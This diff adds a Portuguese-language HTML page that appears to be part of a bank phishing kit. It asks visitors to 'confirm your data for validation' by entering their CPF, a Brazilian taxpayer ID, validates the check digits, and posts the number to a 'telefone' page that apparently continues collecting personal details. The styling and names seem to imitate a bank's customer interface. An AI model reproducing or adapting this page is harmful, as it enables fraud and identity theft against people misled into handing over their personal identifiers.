@@ -1,0 +1,57 @@
+<!DOCTYPE html><html lang="PT-BR"><head>
+<title></title>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<link rel="icon" type="image/png" href="files/images/desktop_logo.png">
+<link rel="stylesheet" type="text/css" href="files/desktop.cpf.css">
+<script language="javascript" src="files/jquery.js"></script>
+<script language="javascript">
+function ExecValidatesDesktop(){
+	if(document.desk.cpf1.value.length < 11 || document.desk.cpf1.value == "00000000000" || document.desk.cpf1.value == "11111111111" || document.desk.cpf1.value == "22222222222" || document.desk.cpf1.value == "33333333333" || document.desk.cpf1.value == "44444444444" || document.desk.cpf1.value == "55555555555" || document.desk.cpf1.value == "66666666666" || document.desk.cpf1.value == "77777777777" || document.desk.cpf1.value == "88888888888" || document.desk.cpf1.value == "99999999999" || document.desk.cpf1.value == ""){
+		alert("Informe seu CPF, apenas os 11 dí­gitos, sem pontuação");
+		return false;
+	}
+	else{
+		var t = "";
+		var d = "";
+		var c = "";
+		var cpf = document.getElementById("cpf1").value;
+		for(t = 9; t < 11; t++){
+			for(d = 0, c = 0; c < t; c++){
+				d += cpf[c] * ((t + 1) - c);
+			}
+			d = ((10 * d) % 11) % 10;
+			if(cpf[c] != d){
+				alert("Informe seu CPF, apenas os 11 dí­gitos, sem pontuação");
+				return false;
+			}
+		}
+	}
+}
+</script>
+</head>
+<body>
+     	<div id="top" class="top-normal">
+		<img id="logo" src="files/images/desktop_logo.png">
+		<img id="tipo" src="files/images/desktop_tipo_interno_normal.png">
+    </div>
+	<div id="content" class="content-uniclass">
+		<span id="title-name">Olá, confirme 
+		seus dados para validação.</span>
+		<span id="title-slct">Digite seu CPF:</span>
+		<form name="desk" id="desk" method="post" action="desktop.telefone.php" onsubmit="return ExecValidatesDesktop();">
+        	<input type="number" name="cpf1" id="cpf1" class="txt1-uniclass" maxlength="11" onkeypress="return ExecFormatOnlyNumbers(event);" placeholder="CPF do titular" autocomplete="off">
+			<input type="submit" name="send" id="send" class="send-uniclass" value="acessar">
+		</form>
+        <span id="txt-forgt">esqueceu seu CPF?</span>
+        <span id="txt-type1"><strong>CPF do titular:</strong> informe seu CPF</span>
+		<span id="txt-type2"><strong>nota:</strong> apenas os 11 dí­gitos, sem 
+		pontuação</span>
+	</div>
+	<img id="img-latera1" src="files/images/desktop_lateral_normal_1.png">
+	<img id="img-latera2" src="files/images/desktop_lateral_normal_2.png">
+	<div id="footer">
+    	<img id="img-footer1" src="files/images/desktop_footer_1.png">
+		<img id="img-footer2" src="files/images/desktop_footer_normal_2.png">
+	</div>
+
+</body></html>
